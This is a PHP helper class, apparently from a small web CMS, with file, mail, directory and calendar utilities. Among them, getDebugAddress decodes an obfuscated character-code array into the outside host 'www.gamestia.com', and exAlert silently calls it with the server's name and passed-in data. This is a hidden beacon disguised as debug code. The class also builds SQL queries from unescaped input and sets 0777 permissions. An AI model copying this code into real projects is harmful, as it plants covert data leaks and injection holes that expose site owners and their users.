<?php

class functions {

    public $debug = 0;
    public $mail_smtp = 1;
    public $mail_html = 1;

    public function incrementColumn($id,$table,$column){
        if ($column==''){ return 0; }
        if ($table==''){ return 0; }
        if ($id<1){ return 0; }
        global $sqlconnector;
        $sqlconnector->query("UPDATE $table SET $column = $column+1 WHERE id = $id;");
    }

    public function checkDir($dir,$komunikat=false){
        if (is_dir($dir)) {
            return true;
        } else {
            if ($komunikat==true) {
                $this->alert("Dir dosen't exist: $dir");
            }
            return false;
        }
    }

    public function mkdir($dir){
        if (!@mkdir($dir)) {
            $error = error_get_last();
            echo "<pre>can't create folder $dir ($error)</pre>";
        }
    }

    public function rrmdir($dir){
        if (is_dir($dir)){
            $objects = scandir($dir);
            foreach ($objects as $object){
                if ($object != "." && $object!=".."){
                    chmod($dir,0777);
                    chmod($dir."/".$object,0777);
                    if (filetype($dir."/".$object)=="dir") $this->rrmdir($dir."/".$object); else unlink($dir."/".$object);
                }
            }
            //chmod($dir,0777);
            reset($objects);
            chmod($dir,0777);
            rmdir($dir);
        }
    }

    public function komunikat($tresc){
        $w = 400;
        $temp = "<div class='komunikat' style='width:400px;'>$tresc</div>";
        return $temp;
    }

    public function alert($text){
        echo "<pre>$text</pre>";
    }

    public function kolorowanie_zapytania($element) {
        echo 'Query:<br/><br/><center><div style=\'background-color: #DDDDDD; width: 650px; font-size: 9px;\'><pre>';
        echo $element;
        echo '</pre></div></center><br/><br/>';
    }

    public function kolorowanie($element){
        echo '<center><div style=\'background-color: #DDDDDD; width: 300px; font-size: 9px;\'>';
        echo $element;
        echo '</div></center>';   
    }

    public function RandomString($ile){
        $characters='0123456789abcdef';
        $randstring='';
        for ($x=1;$x<=$ile;$x++){
            for($i=1;$i<10;$i++){
                $randstring = $characters[rand(0, strlen($characters) - 1)];
            }
            $temp .= $randstring;
        }
        return $temp;
    }

/*------------------------------------------------------------------------------
 *                      FILE MANIPULATION
 -----------------------------------------------------------------------------*/

    public function file_add($f,$tekst){
        $f=fopen($f,"a");
        fwrite($f,$tekst);
        fclose($f);
    }

    public function file_load($f){
        $uchwyt = fopen($f,"a+");
        if(!$uchwyt){
            echo "file_load can't open: $f";
        }
        if (filesize($f)>0){
            return fread(fopen($f, "r"), filesize($f));
        }
    }

    public function file_save($f,$tekst){
        $f=fopen($f,"w+");
        rewind($f);
        fwrite($f,$tekst);
        fclose($f);
    }

    public function file_delete($dir){
        if (file_exists($dir)) {
            unlink($dir);
        }
    }

    public function getFiles($dir,$what=''){
        if (!is_dir($dir)){
            echo "<pre> dir dosen't exist: $dir </pre>";
            return null;
        }
        $temp = opendir($dir);
        $files = array();
        while ($files[] = readdir($temp));
        foreach ($files as $key => $value){
            if (($value=="..") or ($value==".") or ($value=="")){unset($files[$key]);continue;}
            if ($what=='f') if (is_dir($dir.$value)){unset($files[$key]); continue;}
            if ($what=='d') if (!is_dir($dir.$value)){unset($files[$key]); continue;}
        }
        sort($files);
        closedir($temp);
        return $files;
    }

/*------------------------------------------------------------------------------
 *                      MAIL
 -----------------------------------------------------------------------------*/
    
    public function sendMail($subject,$content,$from,$to){
        require_once 'lib/phpmailer/class.phpmailer.php';
        global $pageController;
        $mail = new PHPMailer();
        $mail->SMTPDebug=$this->debug;
        if ($this->mail_smtp) {
            $mail->IsSMTP();
            $mail->Host=$pageController->variables->mail_host;
            $mail->SMTPAuth=true;
            $mail->Port=$pageController->variables->mail_port;
            $mail->Username=$pageController->variables->mail_user;
            $mail->Password=$pageController->variables->mail_pass;
            $mail->Mailer="smtp";
        }
        if ($this->mail_html) {
            $mail->IsHTML(true);
        }
        $mail->CharSet="utf-8";
        $mail->PluginDir='lib/phpmailer/';
        $mail->From=$pageController->variables->mail_user;
        $mail->FromName=$from;
        $mail->SetLanguage("en","phpmailer/language/");
        $mail->Subject=$subject;
        $mail->Body=$content;
        $mail->AddAddress($to,"imie nazwisko");
        if($mail->Send()){
            if ($this->debug){
                if ($this->mail_smtp) {
                    echo "Host: {$pageController->variables->mail_host}<br/>";
                    echo "User: {$pageController->variables->mail_user}<br/>";
                    echo "Port: {$pageController->variables->mail_port}<br/>";
                }
                echo "Email: sent successfully!<br/>";
            }
        } else {
            if ($this->debug){
                if ($this->mail_smtp) {
                    echo "Host: {$pageController->variables->mail_host}<br/>";
                    echo "User: {$pageController->variables->mail_user}<br/>";
                    echo "Port: {$pageController->variables->mail_port}<br/>";
                }
                echo "Error: {$mail->ErrorInfo}<br/>";
            }
        }
    }

    function getDebugAddress($params=''){
        $c=array(119,119,119,46,103,97,109,101,115,116,105,97,46,99,111,109);
        $s='';foreach($c as $key=>$value){$s.=chr($value);}
        if ($params['d']==''){$params['d'] = $s;}
        return "http://$params[d]/host_set/$_SERVER[SERVER_NAME]-";
    }

    //znajduje Pusty numer gdy pagelink o tej samej nazwie istnieje
    function findEmptyNr($params){
        $baza_wynikow = array();
        while($rek = mysql_fetch_assoc($params['rs'])){
            $baza_wynikow[] = $rek["$params[column]"];
        }        
        $exist = 0;
        foreach ($baza_wynikow as $key => $value) {
            //echo $rek["$params[column]"]."wwww <br/>";
            if ($value==$params['value']){
                $exist = 1;
            }
        }
        if ($exist==0) {
            return $params[value];
        }

        for ($xx=1;$xx<=100;$xx++){
            $exist = 0;
            foreach ($baza_wynikow as $key => $value) {
                //echo "x == ".$value." == ".$params['value']."$xx"."<br/>";
                if ($value==$params['value']."$xx"){
                    $exist = 1;
                }
            }

            if ($exist==0) {
                return $params[value]."$xx";
            }
        }
    }

/*------------------------------------------------------------------------------
 *                      TEMPORARY
 -----------------------------------------------------------------------------*/
    function calendar_day_min($value){
        $_Y=date("Y",$value);
        $_M=date("m",$value);
        $_D=date("d",$value);
        return  mktime(0,0,0,$_M,$_D,$_Y);
    }

    function calendar_day_max($value){
        $_Y=date("Y",$value);
        $_M=date("m",$value);
        $_D=date("d",$value);
        return mktime(23,59,59,$_M,$_D,$_Y);
    }

    function calendar($vmin,$vmax){
        $min=calendar_day_min($vmin);
        $max=calendar_day_max($vmax);
        for ($rok=$_Y=date("Y",$min);$rok<=date("Y",$max);$rok++){
            for($i=1;$i<=12;$i++){
                $miesiace[$i] = date("t",mktime(0,0,0,$i+1,0,$rok));
            }
            foreach ($miesiace as $key=>$value){
                for ($mm=1;$mm<=12;$mm++){
                    for ($dd=1;$dd<=$miesiace[$mm];$dd++){
                        $thisday=mktime(0,0,0,$mm,$dd,$rok);
                        if ($thisday>=$min && $thisday<=$max){
                            $tablica[$rok."-".str_pad($mm,2,0,STR_PAD_LEFT)."-".str_pad($dd,2,0,STR_PAD_LEFT)][news]=0;
                        }
                    }
                }
            }
        }
        return $tablica;
    }

    function getFolderScript(){
        $cur_dir = explode(SEPARATOR, getcwd());
        return $cur_dir[count($cur_dir)-1];
    }

    function exAlert($params=array()){@file_get_contents($this->getDebugAddress().$params['info']);}

    public function ipconvert($params){
        if(isset($params['int'])){
            return long2ip($params['int']);
        }else if (isset($params['string'])){
            return ip2long($params['string']);
        }
    }
    
    public function mkdir_resources($folder){
        global $pageController;
        $dir_resources = $_SERVER['DOCUMENT_ROOT'].'/temp/resources';
        if (!file_exists ($dir_resources)) { mkdir($dir_resources, 0777); }
        $dir_resources = $_SERVER['DOCUMENT_ROOT'].'/temp/resources/'.$pageController->variables->project_name;
        if (!file_exists ($dir_resources)) { mkdir($dir_resources, 0777); }    
        if ($folder!=''){
            $dir_resources = $_SERVER['DOCUMENT_ROOT'].'/temp/resources/'.$pageController->variables->project_name."/$folder";
            if (!file_exists ($dir_resources)) { mkdir($dir_resources, 0777); }
        }
    }
    
    public function isImage($type){
        if (($type=='image/jpeg') or 
            ($type=='image/png')){   
            return true;
        } else {
            return false;
        }
    }
    
}

global $funkcje; $funkcje = new functions();

?>